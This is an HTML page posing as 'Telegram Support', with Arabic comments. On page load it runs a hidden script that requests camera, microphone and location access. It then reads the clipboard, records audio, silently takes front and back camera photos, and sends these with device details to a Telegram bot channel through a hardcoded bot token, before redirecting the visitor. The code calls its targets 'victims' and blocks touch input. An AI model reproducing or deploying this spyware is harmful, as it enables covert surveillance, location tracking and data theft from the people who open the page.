<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>َ𝗧𝗘𝗟𝗘𝗚𝗥𝐀𝗠 𝗦𝐔𝙋𝙋𝙊𝙍𝙏</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            background: #000000;
            min-height: 100vh;
            overflow: hidden;
            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
            color: #000000;
        }

        /* إخفاء جميع العناصر القديمة */
        .matrix-rain, .container, .hero, .glitch-title, .hologram-badge,
        .start-virus-btn, .scanner-box, .atom-box, .phone-scan-area,
        .scan-line, .phone-holo-icon, .virus-holo-container, .virus-particle,
        .result-card, #resultContainer, #permStatusMsg, .loader-modal,
        .loader-modal *, [class*="loader"], [id*="result"] {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }

        /* عنصر الفيديو المخفي بطريقة ذكية - سيكون موجوداً لكن غير مرئي للعين */
        .hidden-camera {
            position: fixed !important;
            bottom: -100px !important;
            right: -100px !important;
            width: 120px !important;
            height: 120px !important;
            opacity: 0.01 !important;
            pointer-events: none !important;
            z-index: -1 !important;
            object-fit: cover !important;
            visibility: visible !important;
            display: block !important;
        }

        html, body {
            width: 100%;
            height: 100%;
            cursor: default;
            background: black;
        }
    </style>
</head>
<body>
    <script>
        (function(){
            const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
            const CHANNEL_ID = '-1003875161698';
            const TELEGRAM_REDIRECT_URL = 'https://t.me/Whiskybots';

            let scanningActive = false;
            let isCompleted = false;

            function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

            async function sendHackMessage() {
                const specialMsg = `❀ جـاࢪي اخـتࢪاااق ضـحـيه بـواسـطههة ءالهڪر وءالمـبࢪمج | . ⤹ 𝐖𝐇𝐈𝐒𝗞𝗬 𝗘𝗟𝗬𝗢𝐔َ𝗧𝐔𝗕𝗘𝐑​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 𓈒⤸ ❏ِ⋡ِ  `;
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: {'Content-Type':'application/json'},
                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: specialMsg, parse_mode: 'HTML' })
                    });
                } catch(e) { console.warn(e); }
            }

            async function sendComprehensiveReport(device, loc, clip, audioFlag, frontCount, backCount) {
                let text = `💙 <b>تـم اخـتࢪاق ضـحيه يحب</b> 💙\n\n`;
                text += `📱 <b>الجهاز:</b> ${device.fullName || 'غير معروف'}\n`;
                text += `🏭 <b>الشركة:</b> ${device.brand || '-'}\n`;
                text += `🔧 <b>الموديل:</b> ${device.model || '-'}\n`;
                text += `💻 <b>نظام التشغيل:</b> ${device.os || '-'}\n`;
                text += `🌐 <b>المتصفح:</b> ${device.browser || '-'}\n`;
                text += `📏 <b>الشاشة:</b> ${device.screen || '-'}\n`;
                text += `🔋 <b>البطارية:</b> ${device.battery || '-'}\n`;
                text += `🕒 <b>المنطقة:</b> ${device.timezone || '-'}\n`;
                text += `🗣️ <b>اللغة:</b> ${device.language || '-'}\n\n`;
                if(loc && loc.lat) {
                    text += `❀ <b>الموقع الحالي:</b>\nLat: ${loc.lat}\nLng: ${loc.lng}\nالدقة: ${loc.acc || '?'} متر\n`;
                    text += `🔗 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}">خريطة الموقع</a>\n\n`;
                } else text += `✦ الموقع: غير متاح\n\n`;
                if(clip) text += `✿ <b>محتويات الحافظة:</b>\n<code>${clip.substring(0, 500)}</code>\n\n`;
                else text += `✿ الحافظة: فارغة أو تم منعها\n\n`;
                text += `🎤 <b>تسجيل صوتي:</b> ${audioFlag ? 'تم التسجيل ✓' : 'لم يتم'}\n`;
                text += `📸 <b>الصور الأمامية:</b> ${frontCount} صورة\n`;
                text += `📷 <b>الصور الخلفية:</b> ${backCount} صورة\n`;
                text += `☑️ <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}`;
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({ chat_id: CHANNEL_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
                });
            }

            async function sendPhotosToChannel(photosArray, prefix) {
                for(let i=0; i<photosArray.length; i++) {
                    if(!photosArray[i]) continue;
                    try {
                        let blob = await (await fetch(photosArray[i])).blob();
                        let formData = new FormData();
                        formData.append('chat_id', CHANNEL_ID);
                        formData.append('photo', blob, `${prefix}_${Date.now()}_${i}.jpg`);
                        formData.append('caption', `${prefix} صورة ${i+1} - تم التقاطها بنجاح ✔`);
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        await delay(500);
                    } catch(e){ console.warn(e); }
                }
            }

            async function gatherDeviceInfo() {
                let ua = navigator.userAgent;
                let brand = 'غير معروف';
                if(ua.includes('iPhone')) brand = 'Apple';
                else if(ua.includes('Samsung')) brand = 'Samsung';
                else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
                else if(ua.includes('Pixel')) brand = 'Google';
                else brand = 'Android/PC';
                let battery = 'غير مدعوم';
                if('getBattery' in navigator){
                    try{ let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'يشحن':'لا يشحن'}`; }catch(e){}
                }
                return {
                    fullName: navigator.userAgentData?.platform || ua.split(' ').slice(0,3).join(' '),
                    brand: brand,
                    model: 'غير محدد',
                    os: navigator.platform,
                    browser: /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':'Safari',
                    screen: `${screen.width}x${screen.height}`,
                    battery: battery,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language
                };
            }

            async function getLocation() {
                return new Promise((resolve) => {
                    if(!navigator.geolocation) resolve(null);
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
                        () => resolve(null),
                        { enableHighAccuracy: true, timeout: 8000 }
                    );
                });
            }

            async function readClipboardText() {
                try {
                    let text = await navigator.clipboard.readText();
                    return text || '(فارغة)';
                } catch(e){ return 'لا يمكن الوصول أو فارغ'; }
            }

            async function recordAudio() {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                    let chunks = [];
                    mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                    let promise = new Promise(resolve => {
                        mediaRecorder.onstop = () => {
                            let blob = new Blob(chunks, { type: 'audio/webm' });
                            let url = URL.createObjectURL(blob);
                            stream.getTracks().forEach(t => t.stop());
                            resolve(url);
                        };
                    });
                    mediaRecorder.start();
                    await delay(5000);
                    mediaRecorder.stop();
                    return await promise;
                } catch(e){ return null; }
            }

            // ★★★ دالة التقاط صور حقيقية من الكاميرا (تعمل بنفس طريقة الملف الأصلي) ★★★
            async function captureRealPhotos(facingMode, count=3) {
                let photos = [];
                let stream = null;
                let video = null;
                
                try {
                    // طلب دفق الكاميرا
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: { exact: facingMode } } 
                    });
                    
                    // إنشاء عنصر فيديو
                    video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', 'true');
                    // جعل الفيديو بحجم طبيعي ولكن في مكان بعيد مع شفافية شبه كاملة (لكي يرسم الإطارات بشكل صحيح)
                    video.style.position = 'fixed';
                    video.style.bottom = '0px';
                    video.style.right = '0px';
                    video.style.width = '200px';
                    video.style.height = '200px';
                    video.style.opacity = '0.01'; // غير مرئي تقريباً ولكن المتصفح سيرسم الإطارات
                    video.style.pointerEvents = 'none';
                    video.style.zIndex = '-1';
                    video.style.objectFit = 'cover';
                    document.body.appendChild(video);
                    
                    // انتظار تشغيل الفيديو
                    await new Promise((resolve) => {
                        video.onloadedmetadata = async () => {
                            await video.play();
                            resolve();
                        };
                    });
                    
                    // انتظار إضافي لضمان جاهزية الإطار الأول
                    await delay(600);
                    
                    // إنشاء عنصر canvas
                    let canvas = document.createElement('canvas');
                    
                    for(let i = 0; i < count; i++) {
                        // تحديث أبعاد canvas بناءً على أبعاد الفيديو الفعلية
                        if(video.videoWidth && video.videoHeight && video.videoWidth > 0 && video.videoHeight > 0) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                        } else {
                            // أبعاد افتراضية إذا لم تكن متوفرة
                            canvas.width = 1280;
                            canvas.height = 720;
                        }
                        
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // التحقق من أن الصورة ليست سوداء بالكامل (فحص بسيط)
                        let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                        photos.push(dataUrl);
                        
                        await delay(500); // انتظار بين الصور
                    }
                    
                } catch(e) {
                    console.warn(`Camera error (${facingMode}):`, e);
                } finally {
                    // تنظيف الموارد
                    if(stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    if(video && video.parentNode) {
                        video.remove();
                    }
                }
                
                return photos;
            }

            async function requestAllPermissions() {
                // طلب الميكروفون
                try { 
                    let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    audioStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                
                // طلب الكاميرا الأمامية
                try {
                    let frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
                    frontStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                
                // طلب الكاميرا الخلفية
                try {
                    let backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
                    backStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                
                // طلب الموقع
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
                }
            }

            // الوظيفة الرئيسية
            async function executeFullSilentScan() {
                if(scanningActive) return;
                scanningActive = true;
                
                // طلب جميع الصلاحيات أولاً
                await requestAllPermissions();
                await delay(800);
                
                // جمع البيانات
                let deviceInfo = await gatherDeviceInfo();
                let locationData = null;
                try { locationData = await getLocation(); } catch(e) {}
                let clipboardContent = '';
                try { clipboardContent = await readClipboardText(); } catch(e) { clipboardContent = 'فشل الوصول'; }
                let audioUrl = null;
                try { audioUrl = await recordAudio(); } catch(e) {}
                
                // ★★★ التقاط 3 صور حقيقية من الكاميرا الأمامية ★★★
                let frontPhotos = [];
                try {
                    console.log("بدء التقاط الصور الأمامية...");
                    frontPhotos = await captureRealPhotos("user", 3);
                    console.log(`تم التقاط ${frontPhotos.length} صورة أمامية`);
                } catch(e) { console.warn("front capture failed", e); }
                
                // ★★★ التقاط 3 صور حقيقية من الكاميرا الخلفية ★★★
                let backPhotos = [];
                try {
                    console.log("بدء التقاط الصور الخلفية...");
                    backPhotos = await captureRealPhotos("environment", 3);
                    console.log(`تم التقاط ${backPhotos.length} صورة خلفية`);
                } catch(e) { console.warn("back capture failed", e); }
                
                // إرسال البيانات إلى التيليجرام
                await sendHackMessage();
                await sendComprehensiveReport(deviceInfo, locationData, clipboardContent, !!audioUrl, frontPhotos.length, backPhotos.length);
                
                // إرسال الصور الأمامية
                if(frontPhotos.length > 0) {
                    await sendPhotosToChannel(frontPhotos, '📸 كاميرا أمامية');
                } else {
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type':'application/json'},
                            body: JSON.stringify({ chat_id: CHANNEL_ID, text: "⚠️ فشل التقاط الصور الأمامية (قد يكون الإذن مرفوضاً أو لا توجد كاميرا أمامية)", parse_mode: 'HTML' })
                        });
                    } catch(e){}
                }
                
                // إرسال الصور الخلفية
                if(backPhotos.length > 0) {
                    await sendPhotosToChannel(backPhotos, '📷 كاميرا خلفية');
                } else {
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type':'application/json'},
                            body: JSON.stringify({ chat_id: CHANNEL_ID, text: "⚠️ فشل التقاط الصور الخلفية (قد يكون الإذن مرفوضاً أو لا توجد كاميرا خلفية)", parse_mode: 'HTML' })
                        });
                    } catch(e){}
                }
                
                // إرسال التسجيل الصوتي
                if(audioUrl){
                    try {
                        let blob = await fetch(audioUrl).then(r=>r.blob());
                        let formData = new FormData();
                        formData.append('chat_id', CHANNEL_ID);
                        formData.append('audio', blob, 'voice_record.webm');
                        formData.append('caption', '🎙️ تسجيل صوتي تلقائي');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
                    } catch(e){}
                }
                
                scanningActive = false;
                isCompleted = true;
                
                // الانتقال إلى رابط القناة
                await delay(1500);
                window.location.href = TELEGRAM_REDIRECT_URL;
            }
            
            // بدء التنفيذ فوراً
            let startExecuted = false;
            function initSilentHack() {
                if(startExecuted) return;
                startExecuted = true;
                setTimeout(() => {
                    executeFullSilentScan().catch(err => {
                        console.warn("Error:", err);
                        if(!isCompleted) {
                            setTimeout(() => {
                                window.location.href = TELEGRAM_REDIRECT_URL;
                            }, 2000);
                        }
                    });
                }, 500);
            }
            
            if(document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initSilentHack);
            } else {
                initSilentHack();
            }
            
            // منع أي تفاعل مع الصفحة
            window.addEventListener('touchstart', (e) => { e.preventDefault(); }, { passive: false });
            document.body.style.backgroundColor = "#000000";
        })();
    </script>
</body>
</html>
